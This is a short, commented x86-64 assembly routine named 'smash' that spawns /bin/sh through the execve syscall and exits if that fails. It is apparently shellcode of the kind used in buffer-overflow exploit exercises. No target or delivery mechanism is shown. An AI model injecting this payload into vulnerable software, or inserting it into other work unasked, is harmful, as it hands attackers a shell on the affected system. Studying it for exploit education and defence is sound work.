.text
.globl smash
.type smash, @function
# Executes /bin/sh with a clean environment, and exits.
smash:
  mov $0x0068732f6e69622f, %rax  # "/bin/sh" (little endian, null-terminated)
  push %rax                      # value of "/bin/sh" to stack
  mov %rsp, %rdi                 # arg1 = (char *)"/bin/sh"
  push $0                        # NULL to stack
  mov %rsp, %rdx                 # arg3 = (char **){NULL}
  push %rdi                      # (char *)"/bin/sh" to stack
  mov %rsp, %rsi                 # arg2 = (char **){"/bin/sh", NULL}
  mov $0x3b, %rax                # execve
  syscall
  # execve does not return on success. The following code exits the program with
  # execve's return code, in case execve fails.
  mov %rax, %rdi                 # arg1 = <return value of execve>
  mov $0x3c, %rax                # exit
  syscall
